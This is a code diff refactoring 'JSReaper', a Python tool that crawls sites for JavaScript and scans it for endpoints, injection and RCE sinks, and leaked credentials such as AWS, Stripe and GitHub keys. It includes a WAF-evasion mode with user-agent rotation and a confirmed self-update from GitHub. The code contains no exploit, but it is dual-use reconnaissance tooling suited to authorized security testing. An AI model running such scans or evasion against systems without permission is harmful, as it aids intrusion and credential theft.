+                    f.write(f"  File: {fi.get('source_file','')}\n")
+                    f.write(f"  Line: {fi.get('line','')}\n")
+                    f.write(f"  Match: {fi.get('match','')[:120]}\n\n")
+                f.write(f"ENDPOINTS ({len(endpoints)}):\n\n")
+                for ep, meta in endpoints.items():
+                    params = ",".join(meta["params"]) if meta["params"] else "-"
+                    f.write(f"  {meta['method']:<6} {ep}  [{params}]\n")
+        ok(f"Saved → {path}")
     except Exception as e:
-        error(f"Could not save: {e}")
+        err(f"Could not save: {e}")
 
-# ═════════════════════════════════════════════════════════════════════════════
-#  CLI ARGUMENT PARSER
-# ═════════════════════════════════════════════════════════════════════════════
+
+# ─────────────────────────────────────────────────────────────────────────────
+#  BURP INPUT PARSER
+# ─────────────────────────────────────────────────────────────────────────────
+
+def parse_burp_js_input(raw):
+    """Parse JS URLs from Burp Suite export — handles all formats."""
+    raw = raw.strip()
+    if "\n" not in raw and "," not in raw:
+        parts = re.split(r'(?=https?://)', raw)
+    else:
+        parts = re.split(r'[\n,]+', raw)
+    urls = []
+    seen = set()
+    for part in parts:
+        for u in re.findall(r'https?://[^\s,\'"<>\n]+', part):
+            u = u.strip().rstrip("/")
+            if u and u not in seen:
+                seen.add(u)
+                urls.append(u)
+    return urls
+
+def parse_burp_file(filepath):
+    with open(os.path.normpath(filepath), "r", encoding="utf-8", errors="ignore") as f:
+        return parse_burp_js_input(f.read())
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+#  VERSION CHECK / UPDATE
+# ─────────────────────────────────────────────────────────────────────────────
+
+def check_version(session):
+    print(f"\n{DIM}[~] Checking version...{RESET}")
+    print(f"    {DIM}Tool   :{RESET} {WHITE}{TOOL_NAME}{RESET}")
+    print(f"    {DIM}Version:{RESET} {GREEN}v{TOOL_VERSION}{RESET}")
+    print(f"    {DIM}Author :{RESET} @dr34lm  —  https://x.com/dr34lm")
+    print(f"    {DIM}Purpose:{RESET} Security research & educational use")
+    print(f"    {DIM}OS     :{RESET} {platform.system()} {platform.release()}")
+    print(f"    {DIM}Python :{RESET} {platform.python_version()}")
+    try:
+        r = session.get(LATEST_VERSION_URL, timeout=5)
+        if r.status_code == 200:
+            latest = r.text.strip()
+            if latest == TOOL_VERSION:
+                print(f"    {DIM}Status :{RESET} {GREEN}✓ Up to date (v{TOOL_VERSION} is latest){RESET}")
+            else:
+                print(f"    {DIM}Status :{RESET} {YELLOW}⚠ Update available: v{latest}  →  run: jsreaper --update{RESET}")
+        else:
+            print(f"    {DIM}Status :{RESET} {DIM}Could not check — running v{TOOL_VERSION}{RESET}")
+    except Exception:
+        print(f"    {DIM}Status :{RESET} {DIM}Offline — running v{TOOL_VERSION}{RESET}")
+    print()
+
+
+def self_update(session):
+    print(f"\n{DIM}[~] Checking for update...{RESET}")
+    try:
+        vr = session.get(LATEST_VERSION_URL, timeout=10)
+        if vr.status_code != 200:
+            err("Could not reach GitHub.")
+            return
+        latest = vr.text.strip()
+        print(f"  Current: v{TOOL_VERSION}  |  Latest: v{latest}")
+        if latest == TOOL_VERSION:
+            ok(f"Already up to date (v{TOOL_VERSION}).")
+            return
+        try:
+            ans = input(f"\n  Update v{TOOL_VERSION} → v{latest}? [y/N]: ").strip().lower()
+        except (KeyboardInterrupt, EOFError):
+            print()
+            return
+        if ans not in ("y","yes"):
+            return
+        info("Downloading...")
+        sr = session.get(LATEST_SCRIPT_URL, timeout=30)
+        if sr.status_code != 200:
+            err(f"Download failed (HTTP {sr.status_code})")
+            return
+        content = sr.text
+        if len(content) < 1000 or "def main()" not in content:
+            err("Downloaded file looks invalid — aborting.")
+            return
+        script = os.path.realpath(sys.argv[0])
+        backup = script + ".bak"
+        import shutil as _sh
+        _sh.copy2(script, backup)
+        ok(f"Backup: {backup}")
+        with open(script, "w", encoding="utf-8") as f:
+            f.write(content)
+        try:
+            os.chmod(script, 0o755)
+        except Exception:
+            pass
+        ok(f"Updated to v{latest} ✓")
+    except Exception as e:
+        err(f"Update failed: {e}")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+#  CLI
+# ─────────────────────────────────────────────────────────────────────────────
 
 def build_parser():
-    parser = argparse.ArgumentParser(
+    p = argparse.ArgumentParser(
         prog="jsreaper",
         description=(
-            f"{TOOL_NAME} v{TOOL_VERSION} — JavaScript Recon & Analysis Tool\n"
+            f"JSReaper v{TOOL_VERSION} — JavaScript Security Analysis\n"
             "Written by @dr34lm  |  https://x.com/dr34lm\n"
-            "For research and educational purposes only.\n"
-            "Use only on targets you are authorized to test.\n"
+            "Finds: Exposed Endpoints · SQL Injection · Path Traversal · RCE · Info Disclosure\n"
+            "For authorized research and educational use only.\n"
         ),
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- WALKTHROUGH — STEP BY STEP
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ EXAMPLES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
- CHECK VERSION:
-   jsreaper --version
+ Scan a target (crawls the page for JS, then analyses all files):
+   jsreaper -u https://example.com
 
- BURP SUITE INPUT (paste JS URLs directly from Burp):
-   jsreaper --burp burp_js_list.txt --analyze
-   jsreaper --burp-paste "https://a.com/x.js,https://b.com/y.js" --analyze
+ Scan JS files you found in Burp Suite (paste directly):
+   jsreaper --burp-paste "https://x.com/a.js,https://x.com/b.js"
 
- SINGLE TARGET:
-   jsreaper -u example.com
-   jsreaper -u https://example.com --analyze
-   jsreaper -u http://example.com --analyze --endpoints
+ Scan from a Burp Suite saved JS list file:
+   jsreaper --burp js_files.txt
 
- STATUS CHECK (check if targets are alive before scanning):
-   jsreaper -l targets.txt --status
-   jsreaper -u example.com --subdomains --status
+ Save results:
+   jsreaper -u https://example.com -o results.txt
+   jsreaper -u https://example.com -o results.json --format json
 
- ANALYZE JS FILES:
-   jsreaper -u example.com --analyze
-   jsreaper -u example.com --analyze --deep --beautify
+ Faster scan (more threads):
+   jsreaper -u https://example.com -t 8
 
- CROSS-FILE INTELLIGENCE (auto-enabled with --analyze):
-   jsreaper -u example.com --analyze
-   → JSReaper automatically correlates findings across all JS files
-   → Finds key+endpoint chains, secrets in multiple files, etc.
+ WAF-protected target (slow, rotating user-agents):
+   jsreaper -u https://example.com --waf-aware
 
- SUBDOMAIN SCAN:
-   jsreaper -u example.com --subdomains --scan-subs --analyze
+ De-minify JS before analysing (better results on SPAs):
+   jsreaper -u https://example.com --beautify
 
- SENSITIVE FILE PROBE:
-   jsreaper -u example.com --probe
+ Dump all JS files to disk for manual review:
+   jsreaper -u https://example.com --dump --dump-dir ./js_files
 
- SAVE RESULTS:
-   jsreaper -u example.com --analyze -o results.txt
-   jsreaper -u example.com --analyze -o results.json --format json
+ Skip live endpoint probing:
+   jsreaper -u https://example.com --no-probe
 
- BULK SCAN:
-   jsreaper -l scope.txt -t 5 --analyze --probe -o report.json --format json
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ WHAT IT FINDS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
- WAF-PROTECTED TARGET:
-   jsreaper -u example.com --analyze --waf-aware -t 1
+ 1. ENDPOINTS — Every API endpoint found in JS, probed live
+    for HTTP status (200/401/403/500 = worth testing)
 
- FULL EVERYTHING:
-   jsreaper -u example.com --analyze --deep --probe --subdomains --endpoints --status
+ 2. SQL INJECTION — User-controlled input in SQL queries,
+    template literals with db calls, ORDER BY from params
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- For research and educational purposes only. @dr34lm
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 3. PATH TRAVERSAL / LFI — readFile/sendFile/require with
+    user input, path.join with user-controlled variables
+
+ 4. RCE — eval()/new Function()/exec()/spawn() with user
+    input, dynamic require(), child_process usage
+
+ 5. INFO DISCLOSURE — AWS keys (AKIA format), Stripe live
+    keys (sk_live_), GitHub tokens (ghp_), JWTs, private
+    keys (PEM), database URLs with credentials, Firebase
+    configs, Slack webhooks, and more — all format-verified
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 """
     )
 
-    tg = parser.add_argument_group("Target")
-    tg.add_argument("-u","--url",  help="Single target URL (any format — http/https/bare domain)")
-    tg.add_argument("-l","--list", help="File with one target per line")
-    tg.add_argument("--burp",      help="File containing JS URLs exported from Burp Suite\n"
-                                        "(handles newline, comma, or single-line formats)")
-    tg.add_argument("--burp-paste",metavar="TEXT",
-                                   help="Paste Burp JS URLs directly as a string argument")
+    tg = p.add_argument_group("Target")
+    tg.add_argument("-u","--url",        help="Target URL to crawl for JS files")
+    tg.add_argument("-l","--list",       help="File with one target URL per line")
+    tg.add_argument("--burp",            help="Burp Suite JS file list (file path)")
+    tg.add_argument("--burp-paste",      metavar="TEXT",
+                                         help="Paste JS URLs directly (comma/newline separated)")
 
-    vg = parser.add_argument_group("Version & Updates")
-    vg.add_argument("--version","-V", action="store_true",
-                    help="Show version info and check for updates")
-    vg.add_argument("--update",       action="store_true",
-                    help="Update JSReaper to the latest version from GitHub.\n"
-                         "Backs up the current script before replacing it.\n"
-                         "Example:  jsreaper --update")
+    vg = p.add_argument_group("Version & Updates")
+    vg.add_argument("--version","-V",   action="store_true", help="Show version and check for updates")
+    vg.add_argument("--update",         action="store_true", help="Update to latest version from GitHub")
 
-    sg = parser.add_argument_group("Scan Options")
-    sg.add_argument("--analyze",    action="store_true",
-                    help="[CORE] Analyze all JS files for secrets, vulns, endpoints.\n"
-                         "Also runs cross-file correlation automatically.")
-    sg.add_argument("--deep",       action="store_true",
-                    help="Follow JS import chains to find additional files")
-    sg.add_argument("--probe",      action="store_true",
-                    help="Probe for exposed sensitive files (.env, .git, swagger, etc.)")
-    sg.add_argument("--subdomains", action="store_true",
-                    help="Passive subdomain recon (crt.sh, HackerTarget, AlienVault)")
-    sg.add_argument("--scan-subs",  action="store_true",
-                    help="Scan discovered subdomains for JS (requires --subdomains)")
-    sg.add_argument("--status",     action="store_true",
-                    help="Check HTTP status of all targets/subdomains before scanning.\n"
-                         "Shows color-coded status codes and response times.")
-    sg.add_argument("--endpoints",  action="store_true",
-                    help="Show extracted API endpoints from JS files")
-    sg.add_argument("--js-only",    action="store_true",
-                    help="Only collect .js files, skip other types")
-    sg.add_argument("--beautify",   action="store_true",
-                    help="De-minify JS before analysis (requires jsbeautifier)")
-    sg.add_argument("--verbose",    action="store_true",
-                    help="Show all files including those with no findings")
+    sg = p.add_argument_group("Scan Options")
+    sg.add_argument("--beautify",       action="store_true",
+                    help="De-minify JS before analysing (requires jsbeautifier)")
+    sg.add_argument("--no-probe",       action="store_true",
+                    help="Skip live HTTP probing of discovered endpoints")
+    sg.add_argument("--waf-aware",      action="store_true",
+                    help="Add random delays and rotate user-agents (for WAF-protected targets)")
+    sg.add_argument("--timeout",        type=int, default=12,
+                    help="Request timeout in seconds (default: 12)")
 
-    pg = parser.add_argument_group("Performance & Evasion")
-    pg.add_argument("-t","--threads", type=int, default=3,
-                    choices=[1,2,3,4,5,6,8,10], metavar="{1,2,3,4,5,6,8,10}",
-                    help="Thread count (1=stealth, 3=default, 10=aggressive)")
-    pg.add_argument("--waf-aware",  action="store_true",
-                    help="WAF evasion: random delays, UA rotation, smart retries")
-    pg.add_argument("--timeout",    type=int, default=15,
-                    help="Request timeout in seconds (default: 15)")
+    pg = p.add_argument_group("Performance")
+    pg.add_argument("-t","--threads",   type=int, default=5,
+                    choices=[1,2,3,4,5,6,8,10], metavar="{1-10}",
+                    help="Thread count (default: 5)")
 
-    og = parser.add_argument_group("Output")
-    og.add_argument("-o","--output", help="Save results to file")
-    og.add_argument("--format",      choices=["txt","json"], default="txt",
+    og = p.add_argument_group("Output")
+    og.add_argument("-o","--output",    help="Save results to file")
+    og.add_argument("--format",         choices=["txt","json"], default="txt",
                     help="Output format: txt (default) or json")
-    og.add_argument("--dump",        action="store_true",
-                    help="Download and save raw JS file contents to disk")
-    og.add_argument("--dump-dir",    default="jsreaper_dumps",
-                    help="Directory for JS dumps (default: jsreaper_dumps/)")
+    og.add_argument("--dump",           action="store_true",
+                    help="Save raw JS file contents to disk")
+    og.add_argument("--dump-dir",       default="jsreaper_dumps",
+                    help="Directory for dumped JS files (default: jsreaper_dumps/)")
 
-    return parser
+    return p
 
-# ═════════════════════════════════════════════════════════════════════════════
+
+# ─────────────────────────────────────────────────────────────────────────────
 #  MAIN
-# ═════════════════════════════════════════════════════════════════════════════
+# ─────────────────────────────────────────────────────────────────────────────
 
 def main():
-    import urllib3
-    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-    print(get_banner())
+    print(banner())
 
     parser = build_parser()
     args   = parser.parse_args()
 
-    # version check — early exit
+    session = make_session(waf=args.waf_aware if hasattr(args,'waf_aware') else False)
+
     if args.version:
-        check_version()
+        check_version(session)
         sys.exit(0)
 
-    # self-update — early exit
     if args.update:
-        self_update()
+        self_update(session)
         sys.exit(0)
 
-    # collect targets from all possible sources
-    targets  = []
-    js_only_urls = []   # direct JS URLs from Burp — analyzed differently
-
+    # collect targets
+    targets = []
     if args.url:
         targets.append(args.url)
-
     if args.list:
-        path = os.path.normpath(args.list)
         try:
-            with open(path, "r", encoding="utf-8") as f:
+            with open(os.path.normpath(args.list), "r", encoding="utf-8") as f:
                 targets.extend([l.strip() for l in f if l.strip() and not l.startswith("#")])
         except FileNotFoundError:
-            error(f"File not found: {path}")
+            err(f"File not found: {args.list}")
             sys.exit(1)
 
-    if args.burp:
-        path = os.path.normpath(args.burp)
-        try:
-            parsed = parse_burp_file(path)
-            js_only_urls.extend(parsed)
-            info(f"Parsed {len(parsed)} JS URLs from Burp file: {path}")
-        except FileNotFoundError:
-            error(f"Burp file not found: {path}")
-            sys.exit(1)
+    # burp inputs work as direct JS analysis without a target URL
+    if args.burp or args.burp_paste:
+        if not targets:
+            targets.append("burp://input")   # placeholder
 
-    if args.burp_paste:
-        parsed = parse_burp_js_input(args.burp_paste)
-        js_only_urls.extend(parsed)
-        info(f"Parsed {len(parsed)} JS URLs from --burp-paste")
-
-    targets = list(dict.fromkeys(targets))
-
-    if not targets and not js_only_urls:
+    if not targets:
         parser.print_help()
-        print(f"\n{FG_CRITICAL}[!] Provide a target: -u URL  |  -l file  |  --burp file  |  --burp-paste text{RESET}")
+        print(f"\n{RED}[!] Provide a target: -u URL  or  -l file  or  --burp file{RESET}")
         sys.exit(1)
 
-    info(f"Platform : {get_platform_info()}")
-    info(f"Targets  : {len(targets)}  |  Direct JS URLs (Burp): {len(js_only_urls)}")
-    info(f"Threads  : {args.threads}  |  WAF-aware: {args.waf_aware}  |  Timeout: {args.timeout}s")
-    if args.analyze:    info("Mode: JS Analysis + Cross-File Correlation ON")
-    if args.status:     info("Mode: Status check ON")
-    if args.deep:       info("Mode: Deep crawl ON")
-    if args.probe:      info("Mode: Sensitive file probe ON")
-    if args.subdomains: info("Mode: Subdomain recon ON")
-    if args.dump:       info(f"Mode: JS dump ON → {args.dump_dir}{os.sep}")
-    print()
-
-    session     = build_session(waf_aware=args.waf_aware)
+    targets = list(dict.fromkeys(targets))
     all_results = []
-    start_time  = time.time()
+    start = time.time()
 
-    # ── handle direct Burp JS URLs ─────────────────────────────────────────
-    if js_only_urls and args.analyze:
-        section_header(f"ANALYZING {len(js_only_urls)} BURP JS URLs", FG_SECTION)
-
-        # status check on JS URLs if requested
-        if args.status:
-            run_status_check(js_only_urls, session, threads=args.threads)
-
-        burp_analysis = []
-
-        def analyze_burp(js_url):
-            js_url, resp = try_http_fallback(js_url, session)
-            if not resp or not resp.text:
-                return None
-            return analyze_js_content(js_url, resp.text,
-                                      beautify=args.beautify,
-                                      source_domain=get_domain(js_url))
-
-        with ThreadPoolExecutor(max_workers=args.threads) as executor:
-            futures = {executor.submit(analyze_burp, jf): jf for jf in js_only_urls}
-            for future in as_completed(futures):
-                res = future.result()
-                if res:
-                    burp_analysis.append(res)
-                    if res["findings"] or (args.verbose and res["endpoints"]):
-                        print_analysis(res, show_endpoints=args.endpoints)
-
-        # cross-file correlation on Burp results
-        if len(burp_analysis) > 1:
-            correlations = correlate_findings(burp_analysis)
-            if correlations:
-                print_correlations(correlations)
-
-        # aggregate summary for burp results
-        total_score = sum(r["score"] for r in burp_analysis)
-        total_f     = sum(len(r["findings"]) for r in burp_analysis)
-        critical    = sum(1 for r in burp_analysis for f in r["findings"] if f["severity"]=="critical")
-        high        = sum(1 for r in burp_analysis for f in r["findings"] if f["severity"]=="high")
-        print_summary({
-            "js_files_found": len(js_only_urls), "other_files_found":0,
-            "total_findings": total_f, "critical":critical, "high":high, "medium":0,
-            "risk_score": total_score, "subdomains_found":0,
-            "sensitive_files_found":0, "correlations_found": len(correlations) if len(burp_analysis)>1 else 0,
-        }, "Burp Suite JS Analysis")
-
-        all_results.append({
-            "target":"burp_input","domain":"multiple",
-            "js_files":js_only_urls,"other_files":[],
-            "analysis":burp_analysis,"subdomains":[],
-            "sensitive_files":[],"correlations":correlations if len(burp_analysis)>1 else [],
-            "summary":{"risk_score":total_score,"total_findings":total_f}
-        })
-
-    # ── handle regular targets ──────────────────────────────────────────────
     for i, target in enumerate(targets, 1):
         if len(targets) > 1:
-            print(f"\n{FG_SECTION}[{i}/{len(targets)}] → {target}{RESET}")
-
-        # status check on target + its subdomains if requested
-        if args.status:
-            check_targets = [normalize_url(target)]
-            run_status_check(check_targets, session, threads=args.threads)
-
+            print(f"\n{WHITE}[{i}/{len(targets)}] → {target}{RESET}")
         try:
-            result = scan_target(target, args, session)
-            all_results.append(result)
-
-            # status check on discovered subdomains
-            if args.status and result.get("subdomains"):
-                sub_urls = [f"https://{s}" for s in result["subdomains"]]
-                info(f"Status checking {len(sub_urls)} discovered subdomains...")
-                run_status_check(sub_urls, session, threads=args.threads)
-
+            r = scan(target, args, session)
+            all_results.append(r)
         except KeyboardInterrupt:
-            warn("Ctrl+C — saving partial results...")
+            warn("Interrupted.")
             break
         except Exception as e:
             import traceback
-            error(f"Scan failed for {target}: {e}")
-            # always print traceback so user can see exact cause
+            err(f"Scan failed for {target}: {e}")
             traceback.print_exc()
 
-    elapsed = time.time() - start_time
-    print(f"\n{FG_SUCCESS}[✓] Done in {elapsed:.1f}s{RESET}")
+    elapsed = time.time() - start
+    ok(f"Done in {elapsed:.1f}s")
+    print(f"\n{DIM}  JSReaper v{TOOL_VERSION} by @dr34lm — for authorized research only{RESET}\n")
 
-    if args.output and all_results:
-        save_output(all_results, args.output, fmt=args.format)
-
-    if len(all_results) > 1:
-        section_header(f"AGGREGATE  ({len(all_results)} targets)", LEMON)
-        total_js    = sum(len(r.get("js_files",[])) for r in all_results)
-        total_f     = sum(r.get("summary",{}).get("total_findings",0) for r in all_results)
-        total_crit  = sum(r.get("summary",{}).get("critical",0) for r in all_results)
-        total_high  = sum(r.get("summary",{}).get("high",0) for r in all_results)
-        total_score = sum(r.get("summary",{}).get("risk_score",0) for r in all_results)
-        print(f"  {FG_DIM}JS Files :{RESET} {FG_URL}{total_js}{RESET}")
-        print(f"  {FG_DIM}Findings :{RESET} {FG_HIGH}{total_f}{RESET}")
-        print(f"  {FG_DIM}Critical :{RESET} {SEVERITY_BADGE['critical']} {total_crit} {RESET}")
-        print(f"  {FG_DIM}High     :{RESET} {SEVERITY_BADGE['high']} {total_high} {RESET}")
-        print(f"  {FG_DIM}Score    :{RESET} {FG_MEDIUM}{total_score}{RESET}")
-
-    print(f"\n{FG_WAF}  ⚠  For research and educational purposes only.{RESET}")
-    print(f"{FG_WAF}  ⚠  Only use on targets you are authorized to test.{RESET}")
-    print(f"{FG_DIM}  {TOOL_NAME} v{TOOL_VERSION} by @dr34lm — https://x.com/dr34lm{RESET}\n")
 
 if __name__ == "__main__":
     main()
